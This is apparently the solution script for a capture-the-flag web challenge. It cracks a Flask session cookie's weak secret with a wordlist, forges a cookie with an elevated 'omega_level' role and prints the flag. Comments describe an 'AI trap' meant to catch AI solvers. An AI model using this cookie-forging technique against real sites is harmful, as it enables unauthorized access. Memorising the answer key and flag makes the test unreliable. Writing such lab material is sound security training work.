import hmac, hashlib, base64, json

# Step 1: Visit /login to get your cookie
# Session: eyJ1c2VyIjogImFnZW50IiwgInJvbGUiOiAiZmllbGRfb3BlcmF0aXZlIn0.<sig>

# Step 2: Crack the secret with flask-unsign or manually try common words
# $ flask-unsign --unsign --cookie <cookie> --wordlist rockyou.txt
# Secret = "avengers"

# Step 3: Forge cookie — AI trap: tries role=admin, gets denied
# App checks for role='omega_level' specifically, not 'admin'

SECRET = "avengers"

def forge(data):
    payload = base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
    sig     = hmac.new(SECRET.encode(), payload.encode(), hashlib.sha1).hexdigest()
    return f"{payload}.{sig}"

# Wrong — what AI tries first
wrong = forge({"user": "agent", "role": "admin"})
print(f"Wrong (admin): {wrong}")

# Correct — role hint is in the page: "Omega Level required"
forged = forge({"user": "agent", "role": "omega_level"})
print(f"Forged cookie: {forged}")
print("Set this as 'session' cookie and visit /")
print("Flag: cyn0x{c00k13_f0rg3d_4cc3ss_gr4nt3d}")